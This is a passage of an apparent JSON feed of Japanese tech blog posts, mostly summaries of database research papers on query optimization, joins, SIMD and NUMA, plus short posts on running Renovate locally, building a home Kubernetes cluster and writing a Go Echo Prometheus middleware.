Chaudhuriによる論文Microsoft所属の研究者でRDBMSの研究を行なっており、近年ではCloudにおけるDBMSの研究を行なっている。概要RDBMSが提案された1970年代からクエリ最適化は大規模で幅の広く研究が行なわれてきた。この論文では執筆当時(1998年)までの重要な研究の基礎を説明している。手法探索空間統計情報とコストの推定列挙アルゴリズムアルゴリズムについて説明している。論文内では拡張可能なオプティマイザとして、StarburstとVolcano/Cascadeの2種類のオプティマイザの詳細を論じている。最新(当時)の最適化リアライズドビューについて説明している。作業時間read31:4031:40author33:402:00summary52:5519:15感想ベクトル化やパラレルジョインで扱われていたVolcanoオプティマイザの端に触れることが出来ました。内容としては基礎的な内容が多いものの、知らない概念もいくつかあり引用している論文も読みたいです。クエリ最適化の基礎を学ぶのに非常にいい内容でした。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/15_query_optimization_overview","isoDate":"2023-05-02T01:54:29.000Z","dateMiliSeconds":1682992469000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSとクライアント間におけるデータ転送を最適化する論文を読みました","contentSnippet":"この記事の趣旨2017年に出版されたリモートDBMSとクライアント間の大量データ転送を最適化する手法を提案する論文を読みました。Don’t Hold My Data Hostage – A Case For Client Protocol Redesign著者についてMark Raasveldt、Hannes Muhleisenらのグループによる論文。いずれもCentrum Wiskunde & Informaticaの所属で、DuckDBのCxO。DBMSと分析システムにおけるパフォーマンス最適化を研究している。問題意識DBMSからクライアントプログラムに大量のデータを転送することは一般的なタスクである。例えばRやPythonなどを用いた分析システムはしばしばデータベース・インターフェースを利用してデータの取得を行なっている。一方でネットワーク越しにデータを転送することはレイテンシを増加させ、転送時間を長引かせる要因である。そのため分析用途で大量のデータ転送を避け、一部のデータをサンプルとして利用するに止まることが多い。このアプローチはパフォーマンスの低下を押さえられるものの、分析や機械学習の精度を下げることに繋がる。とくに既存のクライアントではネットワークによるレイテンシとスループットの制限に大きな影響を受けパフォーマンスを劣化させる。この問題はデータベースが別マシンやクラウドで動作するときにより大きな問題となる。手法本論文では既存のシリアライズ手法と圧縮手法によるパフォーマンスへの影響を計測し、新しいプロトコルとして以下の特性を持つ手法を提案している。1. チャンク毎のデータ転送と(デ)シリアライゼーション1. ヒューリスティックによる圧縮方法の決定1. text/binaryによるカスタムシリアライゼーションを使用する1. NULL終端によるテキストの取り扱い実験結果提案手法を実装したMonetDB(表内ではMonetDB++)とPostgreSQL(表内ではPostgreSQL++)を既存のDBMSやnetcatと比較することで評価を行なっている。TCP-Hのlineitem、American Community Survay、Airline On-Time Statisticsの3つのデータセットで評価を行なったところ、ローカル通信における非圧縮netcatを除き殆どのケースでMonetDB++系が最良のパフォーマンスを発揮し次点でPostgreSQL++系が優れた結果を残している。Table 10Table 11Table 12PostgreSQLに比べMonetDBが優れている理由はPostgreSQLの行指向データを列指向に変換するコストのためである。作業時間read31:2131:21author35:384:17summary70:1334:35感想論文出版時にはTPC/IPプロトコルが前提でQuic登場前のため、ネットワークプロトコル自体は考慮されていない。現在であればTPC/IPとQuicに適合した手法の比較が行なわれると思うので気になるところ。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/14_data_transfer_between_server_and_client","isoDate":"2023-05-01T03:34:18.000Z","dateMiliSeconds":1682912058000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"SQL ServerにおけるUDF最適化の論文を読みました","contentSnippet":"この記事の趣旨2017年に発表されたSQL ServerでUDFを最適化しているFroidという手法についての論文を読みました。Froid: Optimization of Imperative Programs in a Relational Database著者についてKarthik Ramachandra、Kwanghyun Park、K. Venkatesh Emani、Alan Halverson、Cesar Galindo-Legaria、Conor Cunninghamのグループによる論文。ほとんどの著者はMicrosoftに所属しており、いずれもトランザクショナルワークロードでのRDBMSの最適化や分析ワークロードにおけるRDBMS最適化の研究をしている。問題意識RDBMSではSQLによるデータ処理アプローチと、UDFやストアドプロシージャなどによる命令型のデータ処理アプローチを提供している。SQLによるデータアクセスは高度に最適化されてきた一方で、命令型のデータ処理は非効率なため性能を阻害し利用を禁止している組織すらある。UDFによるデータアクセスは非効率であるものの、SQLに比べ下記のような利点を提供するため幅広く利用されているのも事実である。1. SQL間でコードの再利用方法を提供する1. 複雑なビジネスロジックやMLアルゴリズムなどSQLでは難しい表現を可能にする1. 単純なSQLの組み合わせのため、ユーザーの意図が明確に表現できるこれらのメリットを享受するためにRDBMSにおける命令型データアクセス手法のパフォーマンスを向上しする必要があった。手法提案手法であるFroidはMicrosoft SQL Serverにおける命令型コードのパフォーマンス向上の手法として、UDFを複雑なサブクエリとしてみなすアプローチを取っている。UDFを構成する命令はDECLARE、SELECT、IF/ELSE、RETURN、他のUDF、リレーショナルオペレーションの6つに分ることができる。提案手法ではこれらの命令を一般的なT-SQLに置き換え、Apply演算により一つの関係式に結合する方法で実現している。Table 1命令が一般SQLに置き換えられることでUDFに対して、SQLに用いられていた高度な最適化を導入することが出来る。また提案手法ではい以下の理由から、SQLとして命令を置換するときにクエリ最適化時に行なうのではなくバインド時に置換をしている。1. 実際のワークロードでの実験ではほぼ全てのケースでバインド時のほうが性能がよかった1. クエリオプティマイザの変更が不要1. バインディング時に特定の最適化を行なえるとくにクエリオプティマイザの変更はSQL Serverが商用データベースなため重要であった。作業時間read28:5028:50author32:103:20summary57:0024:50","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/13_sql_server_udf_optimization","isoDate":"2023-04-28T02:29:05.000Z","dateMiliSeconds":1682648945000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Pull Requestで意識していること","contentSnippet":"どんな記事？Pull Request（以後PR）で自分がレビュイのときに意識していることをまとめてみました。PRだけじゃなくSlack等のテキストベースコミュニケーションでも同じようなことを意識…","link":"https://qiita.com/bayobayo0324/items/0d986370e0de95705b6f","isoDate":"2023-04-28T02:19:23.000Z","dateMiliSeconds":1682648363000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"DBMSの歴史とNewSQL","contentSnippet":"この記事はDBMSの登場以前から現代のDBMSを取り巻く環境までを振り返ることで、なぜNewSQLが必要とされ登場したのかをまとめます。 おことわり筆者はあくまでDBMSユーザーであり、研究者ではないため内容は個人の見解です。また対象読者はある程度DBMSに関わりがあり、OLTPやOLAP、列指向や行指向といった基本的な単語を理解しているものとします。またNewSQLの技術的詳細はスコープ外とします。 DBMS以前データベースという言葉は1950年代に米軍が情報基地を集約したことに由来します。一方で学術的なデータベースの起源はW. C. McGeeが1959年に発表...","link":"https://zenn.dev/nnaka2992/articles/history_of_db_and_newsql","isoDate":"2023-04-26T14:28:19.000Z","dateMiliSeconds":1682519299000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[DBREブログ] Snowflake とは？","contentSnippet":"はじめに クラウドデータウェアハウスの Snowflake についての解説です。Snowflake のアーキテクチャや料金体系、特徴、セキュリティについて説明しています。 概要 プラットフォームの概要 Snowflake […]The post [DBREブログ] Snowflake とは？ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/what-is-snowflake/","isoDate":"2023-04-26T02:37:56.000Z","dateMiliSeconds":1682476676000,"authorName":"Sreake","authorId":"Sreake"},{"title":"中間結果が莫大になるときの結合を最適化する最悪ケース最適化結合をRDBMSに適応する論文を読みました","contentSnippet":"この記事の趣旨2018年に発表された分析ワークロードなどで発生しがちな最終結果に比べ、非常に大きな中間結果を作成してしまうクエリを多方向結合で最適化する論文を読みました。Adopting Worst-Case Optimal Joins in Relational Database Systems著者についてMichael Freitag、Maximilian Bandle、Tobias Schmidt、Alfons Kemper、Thomas Neumannによるグループの論文いずれの著者もDBMSにおける最適化を中心に研究しており、それぞれ分析ワークロードにおける最適化や最新のハードウェアにおける最適化などを研究している。問題意識従来のRDBMSにおける結合処理のほとんどはバイナリ結合に依存して複数のリレーションにまたがるクエリを処理してきた。数十年に渡る研究によりバイナリ結合は幅広い柔軟性と優れた性能を発揮するようになった。その一方でバイナリ結合による実行計画は特定のワークロードでは最適ではないケースを示すことが知られている。主な原因として実際のクエリ結果に比べて非常に大きな中間結果を生成するためである。とくにPK以外のキーによる結合が多くなる分析ワークロードではそのような状態を避けることが難しく、またグラフ分析のようなクエリパターンでも多く見られる。近年の論理的な進歩により中間結果の列挙を避ける多方向結合のアルゴリズムが開発可能になった。この手法はバイナリ結合計画より優れた実行時間を保証できるため、RDBMSの堅牢性を大幅に向上させる可能性を持っている。しかし現状最悪ケース最適化結合アルゴリズムでは以下のような問題を抱えている。1. 膨大なストレージとメンテナンスを必要とする結合に参加出来るカラムを含むインデックスを必要とする。1. RDBMSは挿入と更新のサポートが必要なものの、既存のアルゴリズムは高価な事前計算を必要とする。そのため本論文は以下の制約を満たすアプローチを提案している1. 多方向結合が有益な場合のみ多方向結合を使用するオプティマイザを必要とする。1. 実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。手法提案手法では比較ベースではなくハッシュベースの結合のため、2の「実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。」という要素の考慮を除いている。またオプティマイザについては既存のコストベースのものを拡張し適応している。提案手法では潜在的に成長している結合のカスケードを最悪の場合の最適結合に置き換えることで、最適化されたバイナリ結合計画を洗練させるヒューリスティックなアプローチを提案している。通常の結合順序最適化で使用されるのと同じカーディナリティ推定値に基づいて、中間テーブルが膨大になる結合を特定する。作業時間read22:1322:13author25:483:35summary52:5826:50感想とても難しい内容に感じてしまい、殆ど頭を通りすぎてしまった気がする。今まで最適化は触れずに来たため、理解が浅い領域だった。よくよく考えるとDBMSの話しに最適化が登場するのはあたりまえなので、今後はその方面にも触れて行きたい。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/12_worst_case_optimal_join","isoDate":"2023-04-26T02:06:46.000Z","dateMiliSeconds":1682474806000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"マルチコアメインメモリにおけるソートジョインとハッシュジョインのパフォーマンスを検証した論文を読みました","contentSnippet":"この記事の趣旨2013年に発表された\\"Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited\\"という論文を読みました。当時最新のアルゴリズムとハードウェアにおける、ソートとハッシュによる結合のパフォーマンスを比べた論文です。Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited著者についてCagri Balkesen、Gustavo Alonso、Jens Teubner、M. Tamer Ozsuらのグループによる論文いずれもDBMSにおけるクエリ最適化やビッグデータにおけるパフォーマンスを研究している。またGustavo Alonsoはハードウェアや分散システムもメインのフィールドとしている。問題意識DBMSにおいて常にソートマージとハッシュ結合の性能比較が行われており、最新の研究ではSIMDやNUMAへの適正に基づいてソートマージがより優れていると結論づけられていた。しかしこれらの分野は常に研究が重ねられ、過去の検証時には登場していなったハッシュ結合の最適化手法が生れた。この論文ではそれらを適用し再度ソートマージとハッシュ結合の性能比較を行なう。手法本論文では以下に分けて結合手法の評価を行なっている。1. ソートフェーズの評価SIMDソートアルゴリズムとC++のSTLソートアルゴリズムを比較している。マージフェーズの評価入力サイズの調整によるマージフェーズの最適化パーマンスを検証している。ソートマージジョインにおける影響要因の特定結果結合対象のデータサイズに拘わらずハッシュによる結合がソートベースの結合のパフォーマンスを上回っている。Figure 14ソートマージによる結合は入力サイズが著しく大きくなったときのみハッシュ結合のパフォーマンスに近づく。Figure 15ソートマージ、ハッシュ結合におけるデータの偏りはパフォーマンスに大きな影響を及ぼさなかった。Figure 16いずれのアルゴリズムも物理的なコア数では線形にスケールした。Figure 17作業時間read23:1123:11author27:093:58summary60:1232:57","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/11_join_performance_comparison","isoDate":"2023-04-24T02:23:54.000Z","dateMiliSeconds":1682303034000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"RDBでの結合手法を比較した論文を読みました","contentSnippet":"この記事の趣旨2016年に発表された\\"An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory\\"という論文を読みました。様々な結合手法を包括的に比較した論文でどのような結合方法がどのような時に適しているかを示しています。An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory著者についてStefan Schuh、Xiao Chen、Jens Dittrichのグループによる論文。いずれもDBMSや分析システム、Hadoopなどにおける検索高速化・最適化の研究を行なっている。問題意識関係結合はほとんど全てのクエリプランにおいて中核をなす処理であり、定期的に研究・改良され再検討されてきた。新たな手法が提案され実験を行なわれるものの、それぞれ結果において比較を困難にする要素や幾らかの矛盾を孕んでいた。例えば同じハッシュベースの結合アルゴリズムの比較でも実装が異なったり、複数の論文でパフォーマンス比較で正反対の結果を示しているためである。そのため単純に論文執筆時点で最も高速な結合アルゴリズムを結論づけることが困難であった。手法本論文では結合方法を以下の3つに分類した1. パーティションベースハッシュジョインパーティションに分割し結合する手法。ハッシュテーブルの構築と結合されるデータの探索のキャッシュミスを最小にする事を目的としている。非パーティションベースハッシュジョインパーティションテーブルを構築しながら結合を行なう手法で、マルチスレッドと順番に依存しない実行によりキャッシュミスのパフォーマンス劣化を隠蔽している。ソートマージジョインSIMDによりベクトル化される。検証ではこれらの結合方法を以下の3つのテストで使用するために、全部で13のアルゴリズムを検証している。1. ブラックボックス比較ブラックボックス的に比較する。ホワイトボックス比較ブラックボックス比較で検証する結合方法に先行研究で示された最適化を施した上で比較を行なう。パラレルラディックスジョイン比較Table 2結果パーティション結合の一種であるリモート書込みを排除したCPR系アルゴリズムは小さな入力に対して有効ではないスケールの大きい結合ではとくに理由が無い場合、パーティションベースのジョインを利用する大きなサイズのページを利用するソフトウェアライトコンバインバッファ()を利用するパーティションジョインでは適切なパーティションビットを利用するできるかぎりシンプルなアルゴリズムを利用するNUMAを考慮したアルゴリズムを利用する実行時間とクエリ時間は同一ではない作業時間read31:3431:34author35:183:46summary77:5042:32","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/10_join_method_comparison","isoDate":"2023-04-23T14:16:28.000Z","dateMiliSeconds":1682259388000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"新卒2年目がAWS12冠を達成し、2つの賞を受賞するまで。","contentSnippet":"はじめに先日の2023 AWS Summit Tokyoで今年のAWSに関する受賞者が発表されました！各賞の詳細についてはこちら私は、2023/3月までに（新卒2年目で）12冠を達成したので、…","link":"https://qiita.com/yokoo-an209/items/0b9ca7b2eddbb586dcbc","isoDate":"2023-04-22T12:19:16.000Z","dateMiliSeconds":1682165956000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"コンパイルとベクトル化による最適化のパフォーマンスを比較した論文を読みました","contentSnippet":"この記事の趣旨2018年に発表された\\"Everything You Always Wanted to Know AboutCompiled and Vectorized Queries But Were Afraid to Ask\\"という論文を読みました。最新のクエリエンジンの特性をまとめ、どのようなワークロードに向くのかという指針を示すないようです。Everything You Always Wanted to Know About Compiled and Vectorized Queries But Were Afraid to AskTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Boncz著者についてTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Bonczのグループによる論文。いずれも大規模データにおけるクエリパフォーマスや最適化に関する研究を行なっている。問題意識分析ワークロードに向いた最新のクエリエンジンはベクトル化またはデータ中心のコード生成に基づいている。どちらのモデルも従来のエンジンに比べオーバーヘッドが少く、非常に効率的なものの概念的には大きく異なっている。この2つのモデルの違いは、DBMSの実行エンジンのソースコードの構成とその性能特性を決定する基本的なもので、クエリ実行モデルを超える多くの設計で異なる。本論文はことなる2つのモデルを再実装し、環境差異のないマシンで実行することでそれぞれのモデルがどのように違うのか。どのような用途に最適なのかを検証している。手法検証手法は著者らがC++で再実装したデータ中心モデルの「Taper」とベクトル化中心の「Tectorwise」を同一のマシンでパフォーマンス検証を行っている。検証項目は以下から成る1. インメモリOLAPワークロードでのマイクロアーキテクチャ分析1. SIMDの利点の検証1. マルチコアCPUにおけるクエリ並列化1. 異なるハードウェアでのパフォーマンス結果インメモリOLAPワークロードでのマイクロアーキテクチャ分析Figure 3: Performance – TPC-H SF=1, 1 threadSIMDの利点の検証SIMDを評価するにはTectorwiseのみを用いた。SIMDではスカラーなデータをベクトルに変換するペナルティは少く、最大8.4倍の性能向上が確認された。Figure 6: Scalar vs. SIMD Selection in TectorwiseマルチコアCPUにおけるクエリ並列化異なるハードウェアでのパフォーマンスIntel Skylake、Intel Knights Landing、AMD Ryzenで対照実験を行なったものの、いずれのハードウェアでもTyper、Tectorwiseともに有効に動作した。作業時間read29:2629:26author33:233:57summary76:3742:44感想VoectorwiseとHyperのいずれを使うべきか。どちらが優れているかといった疑問に答えるないようだった。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/9_compile_vs_vectorize_performance","isoDate":"2023-04-21T01:45:06.000Z","dateMiliSeconds":1682041506000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ポリテクセンターのススメ","contentSnippet":"はじめに各都道府県には職業能力開発促進センター（ポリテクセンター）と呼ばれる職業訓練を行う施設があります。プログラマやインフラエンジニアになるためにここ数年スクールを受講するのが流行っていますが、今回はこのポリテクセンターをおすすめしたいと思います。ポリテクセンターでは求職者向け訓練と在職者向け訓練があります。求職者向け訓練はこれから会社に就職するために6ヶ月ほど訓練を受講します。在職者向け訓練はすでに会社に就職している人向けの1〜3日ほどの内容を絞った講座形式になります。 求職者向け訓練例えば神奈川県にあるポリテクセンター関東では以下の求職者向け訓練があります。...","link":"https://zenn.dev/satoken/articles/polytech-susume","isoDate":"2023-04-21T00:57:44.000Z","dateMiliSeconds":1682038664000,"authorName":"satoken","authorId":"satoken"},{"title":"Renovateをローカルで動かす","contentSnippet":"Renovateには様々な実行方法がありますが。ここではローカルで動かす方法について説明します。Renovateをクローンするhttps://github.com/renovatebot/renovateからクローンしましょう。これ以降はクローンしたリポジトリのルートディレクトリで作業します。実行環境コンテナ.devcontainer/Dockerfileをビルドします。docker build -f .devcontainer/Dockerfile -t renovatebot_local .Renovateの依存パッケージをインストールdocker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app renovatebot_local yarnローカル実行時のオプションドキュメントを参考に、引数を与えてください。ログレベルdebugでGitLabリポジトリに対して実行する場合は、以下のようになります。例：docker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app -e LOG_LEVEL=debug -e GITHUB_COM_TOKEN=*** renovatebot_local yarn start --platform gitlab --token *** {リポジトリ}※{リポジトリ}のところはユーザー名/リポジトリ名のような感じです。","link":"https://kechigon.hatenablog.com/entry/2023/04/20/140449","isoDate":"2023-04-20T05:04:49.000Z","dateMiliSeconds":1681967089000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文を読みました","contentSnippet":"この記事の趣旨2020年に提案された\\"Make the most out of your SIMD investments: counter control flowdivergence in compiled query pipelines\\"という論文を読みました。SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文です。Make the most out of your SIMD investments: counter control flow divergence in compiled query pipelinesHarald Lang, Linnea Passing, Andreas Kipf, Peter Boncz, Thomas Neumann, Alfons Kemper著者についてHarald Lang、 Linnea Passing、 Andreas Kipf、 Peter Boncz、 Thomas Neumann、 Alfons Kemperのグループによる研究いずれも最新のアーキテクチャでのクエリ最適化やデータ分析における検索手法などを研究している。問題意識CPUの発展にともないあたらしいCPUアーキテクチャが登場した。Single Instruction Multiple Data(SIMD)ではRDBはSIMDによるベクトル処理能力の向上により、クエリコンパイラの実行パイプライン全体をベクトル化して高度なデータ並列性の恩恵を受けることが出来るようになった。一方でクエリ全体をベクトル化して実行することで、SIMDによるクエリ評価が忙しくなる。SIMD評価で結果に寄与しない評価が単純にオーバーヘッドとなってしまう。手法本論文ではリフィルアルゴリズムとそのアルゴリズムをクエリパイプラインプランに統合する手法で上記の問題の解決を試みている。リフィルアルゴリズムは基本的に新しい要素を宛先レジスタの希望する位置にコピーするアルゴリズムで、メモリからレジスタとレジスタからレジスタへのコピーの2パターンが存在する。クエリパイプラインプランに統合するリフィル戦略ではConsume EverythingパターンとPartial Consumeパターンが存在する。Consum Everything戦略は、タプルをバッファリングするために使用される追加のベクターレジスタを割り当てる方法で利用率が低い場合、オペレータはこれらのタプルの処理を延期する。つまり、この反復ではボディは実行されず(条件が満たされない場合)、代わりにアクティブなタプルがこれらのバッファレジスタに移動することになる。Partial Consume戦略ではconsume()コードを入力の一部に適用する方法で、制御フローを前のオペレータに戻し、アクティブなデータ断片のみをベクトルレジスタに残すことで実行を延期している。作業時間read29:4029:40author33:404:00summary60:0426:36感想前回に引続き個人的には難しいと感じる論文だった。2000年前後の提案にくらべ、2015年前後の論文ではハードウェアアーキテクチャを中心とした手法がピックアップされている。単純に自分の知識不足、理解力不足なので勉強するしかない。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/8_counter_control_flow_divergence_in_compiled_query_pipelines","isoDate":"2023-04-20T02:00:20.000Z","dateMiliSeconds":1681956020000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"NUMAアーキテクチャでのクエリ最適化に関する論文を読みました","contentSnippet":"この記事の趣旨\\"Morsel-Driven Parallelism: A NUMA-Aware Query Evaluation Framework forthe Many-Core Age\\"という2014年に発表された、多コアサーバにおけるクエリ最適化手法をあつかった論文を読みました。[Morsel-Driven Parallelism: A NUMA-Aware QueryEvaluation Framework for the Many-Core Age](https://15721.courses.cs.cmu.edu/spring2023/papers/07-scheduling/p743-leis.pdf)Viktor Leis, Peter Boncz, Alfons Kemper, Thomas Neumann著者についてViktor Leis、 Peter Boncz、 Alfons Kemper、Thomas Neumannのグループによる研究いずれもデータベースと 高速化かを中心に研究している。問題意識コンピュータアーキテクチャの進化にともない、二つのあたらしい問題が生じた。多コアを利用するためにクエリを数百のスレッドに均等に分散させるそれをNUMA(Non-Uniform Memory Access)による順序通りではないメモリアクセスで実現する必要がある。これらの要因からplanベースの並列処理による不可分散とコンテキストスイッチとボトルネックが問題になりスケールが難しかった。NUMAによってデータとアクセススレッドがどのチップに配置されるかによって、データ項目のアクセスコストが異なるため、コンピュータ自体がネットワークになっており、多コア並列化では、RAMやキャッシュ階層を考慮する必要がある。この論文ではMoral-drivenクエリ実行フレームワークを提案している。手法提案手法は並列クエリ処理のため、morselドリブンクエリ評価フレームワークを提示した。これはメニーコア時代の分析クエリ性能の主要なボトルネックである負荷分散、スレッド同期、メモリアクセス局所性およびリソース弾力性を解決することを目的としている。ベースとなるアイデアは以下の2つに分けられる。メモリ上のデータをmorselと呼ばれる小さなバッチに分割し、バッチごとに処理を実行したあとにそれぞれの処理結果をグローバルハッシュテーブルとしてまとめる。Figure 3: NUMA-aware processing of the build-phaseディスパッチャと呼ばれる並行パイプライン制御を行ない、ワーカースレッドをタスクに割り当てるFigure 5: Dispatcher assigns pipeline-jobs on morsels to threads depending on the coreまとめとして著者はきめ細かいスケジューリング、完全演算子並列化、低オーバーヘッド同期、NUMA対応スケジューリングの原理を用いて、他のシステムでもメニーコアスケーリングを改善できると示唆している。作業時間read28:3628:36author32:453:09summary60:3727:52感想近現代のサーバアーキテクチャで主流になっているNUMAでのクエリパフォーマンス向上のための論文のため、古典的なものに比べ概念が難しいものが多い。もう少し理解を深めたい。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/7_numa_aware_query_evaluation_framework","isoDate":"2023-04-18T01:01:35.000Z","dateMiliSeconds":1681779695000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おうちk8sクラスターを構築していて詰まったところ","contentSnippet":"おうち Kubernetes インターンを参考に機材調達->OSインストール->kubeadamでクラスター構築と一通りやってみたので、トラブったところと解決策を共有します。USBメモリRaspberry PiにOSをインストールする際に、SDカードの性能が悪いと失敗します。私は安物で済ませようとした結果、三枚目でようやく成功しました。またインストール後も、ディスクの読み書き速度は全体のパフォーマンスに影響を与えるので、性能にはこだわるべきです。以下のサイトなどを参考に選びましょう。https://www.kingston.com/jp/blog/personal-storage/memory-card-speed-classeshttps://osusumepc.com/raspberry-pi-microsd/cgroups の Memory Subsystem を有効化私がインストールしたOSでは、cgroups の Memory Subsystem がデフォルトで無効化されているため、/boot/firmware/cmdline.txtに下記を追加する必要がありました。cgroup_memory=1 cgroup_enable=memoryしかし、編集し再起動しても有効化されませんでした。原因は改行を入れて追加していたことでした。改行せず行末に追加するのが正しいです。","link":"https://kechigon.hatenablog.com/entry/2023/04/17/174444","isoDate":"2023-04-17T08:44:44.000Z","dateMiliSeconds":1681721084000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"列指向DBMSにおけるデータを提案した論文を読みました","contentSnippet":"この記事の趣旨\\"MonetDB/X100: Hyper-Pipelining Query Execution\\"という2005年に発表された、列指向DBMSを提案した論文を読んでいきます。分析ワークロード向けRDBMSにおける初期実装であるMonetDBを扱った論文で、提案時期が2005年と古くはあるものの現代のDWHの礎となる内容です。MonetDB/X100: Hyper-Pipelining Query ExecutionPeter Boncz, Marcin Zukowski, Niels Nes著者についてPeter Boncz、Marcin Zukowski、Niels Nseのグループによる論文。いずれの著者も機械学習や分析におけるDBMSについて研究している。問題意識2005年当時のDBMSは他のアプリケーションに比べ、IPCが低くなる傾向にあった。原因はほとんどのDBMSがコンパイラの最適化を阻害する実装だったためである。これはRDBMSが実装された当時に比べCPUやコンパイラが発達したためで、この論文ではC-store DBMSであるMonetDBと従来のR-store DBMSをそれぞれTPC-Hで評価を行い、パフォーマンス阻害要件と最適化方法を提案している。手法CPUによるIF文の処理方法はDBMSにとっては選択性が低く、そういった実行は予測不可能でありクエリ実行を著しく劣らせた。提案手法ではMonetDB/X100として効率的なシーケンシャルアクセスに向けた、C-storeストレージとクエリエンジンを実装した。RAMは提案手法のデータアクセスと同様の方法で圧縮して保存し、Cacheではなベクトル化された処理にもとづくパイプライン実装を使用した。CPUにおいてもベクトル型における式計算を提供し、コンパイラが高効率な処理を生成した。結果として提案手法は従来のDBMS実行に比べTPC-Hで優れた性能をしめした。作業時間read21:3221:32author29:007:28summary56:2027:20感想2005年と古く、またVolcano-likeなど知らない概念も登場した。提案内容としては現代のDWHが採用しているものだった。論文外の感想今回本文を読む時間を大幅に短くしてみたが、それにともない理解度も低下した気がする。やっぱり30分以上で読むのがよさそう。","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/6_hyper_pipelining_query_execution","isoDate":"2023-04-17T01:16:56.000Z","dateMiliSeconds":1681694216000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Golang のEcho でMiddlewareを使ってPrometheus Exporter を実装する","contentSnippet":"はじめにもし、アプリケーションに実装できるならそれが良いです。独自に実装などせずにエンドポイントにて500 Internal Server Errorが多発していればアラートをすれば良いので...。こちらの続編になります。syu-m-5151.hatenablog.com本エントリーでは、GolangでEchoフレームワークを使用し、Prometheus ExporterをMiddlewareとして実装する方法について説明します。Prometheus Middlewareは、自動でMetrics を生成します。これにより、アプリケーションのパフォーマンス監視や問題解析が容易になります。利用しているコードはこちらgithub.comはじめにコードを解説するんじゃいvarinitmeasureExternalAccessunstableEndpointMiddlewareを適用Prometheus Middlewareを適用EchoのMiddlewareについてEcho Echo Middleware の特徴再び、Docker Compose での実行するんじゃろがい見れたぞぉおおおおさいごにコードを解説するんじゃいシンプルだけど解説をします。環境構築などは前回のエントリーに任せます。Echoフレームワークを使ってGolangでシンプルなWebアプリケーションを作成し、Prometheus Exporterをミドルウェアとして実装する例です。package mainimport (    \\"math/rand\\"    \\"net/http\\"    \\"time\\"    \\"github.com/labstack/echo-contrib/prometheus\\"    \\"github.com/labstack/echo/v4\\"    \\"github.com/labstack/echo/v4/middleware\\"    prom \\"github.com/prometheus/client_golang/prometheus\\")// Prometheus のメトリクスを定義しています。// これらのメトリクスは、3-shake.com への外部アクセスの情報を収集するために使用されます。var (    externalAccessDuration = prom.NewHistogram(        prom.HistogramOpts{            Name:    \\"external_access_duration_seconds\\",            Help:    \\"Duration of external access to 3-shake.com\\",            Buckets: prom.DefBuckets,        },    )    lastExternalAccessStatusCode = prom.NewGauge(        prom.GaugeOpts{            Name: \\"last_external_access_status_code\\",            Help: \\"Last status code of external access to 3-shake.com\\",        },    ))// init 関数内で、メトリクスを Prometheus に登録しています。func init() {    prom.MustRegister(externalAccessDuration)    prom.MustRegister(lastExternalAccessStatusCode)}// 3-shake.com の外部アクセスを計測するミドルウェアを作成します。func measureExternalAccess(next echo.HandlerFunc) echo.HandlerFunc {    return func(c echo.Context) error {        // HTTP クライアントを作成し、タイムアウトを 10 秒に設定します。        client := &http.Client{Timeout: 10 * time.Second}        // 現在の時刻を取得し、アクセス開始時間として保持します。        startTime := time.Now()        // 3-shake.com に対して HTTP GET リクエストを送信します。        resp, err := client.Get(\\"https://3-shake.com\\")        // アクセス開始時間から現在の時刻までの経過時間を計算し、duration に格納します。        duration := time.Since(startTime)        // エラーが発生しない場合（リクエストが成功した場合）        if err == nil {            // アクセス時間（duration）をヒストグラムメトリクスに追加します。            externalAccessDuration.Observe(duration.Seconds())            // ステータスコードをゲージメトリクスに設定します。            lastExternalAccessStatusCode.Set(float64(resp.StatusCode))            // レスポンスのボディを閉じます。            resp.Body.Close()        }        // 次のミドルウェアまたはハンドラ関数に処理を移します。        return next(c)    }}func unstableEndpoint(c echo.Context) error {    // 0 から 4 までのランダムな整数を生成します。    randomNumber := rand.Intn(5)    // 生成された整数が 4 の場合、HTTP ステータスコード 500 を返します。    if randomNumber == 4 {        return c.String(http.StatusInternalServerError, \\"Something went wrong!\\")    }    // それ以外の場合、HTTP ステータスコード 200 を返します。    return c.String(http.StatusOK, \\"Success!\\")}func main() {    e := echo.New()    // ミドルウェアの設定    e.Use(middleware.Logger())    